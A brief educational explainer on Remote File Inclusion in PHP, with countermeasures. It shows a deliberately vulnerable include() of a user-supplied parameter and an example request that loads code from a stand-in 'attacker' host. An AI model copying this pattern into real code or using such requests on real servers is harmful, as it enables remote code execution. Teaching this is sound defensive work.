# RFI

**Remote File Inclusion** (**RFI**) is a vulnerability where a server includes
remote files specified by the user.

## Example

Consider the following PHP statements

```php
$incfile = $_REQUEST["file"];
include($incfile.".php");
```

This would be vulnerable to
`http://localhost/page.php?file=http://attacker/malicious_page`.

## Countermeasures

Disallow including remote files if not needed. Otherwise, use a whitelist of
accepted URLs
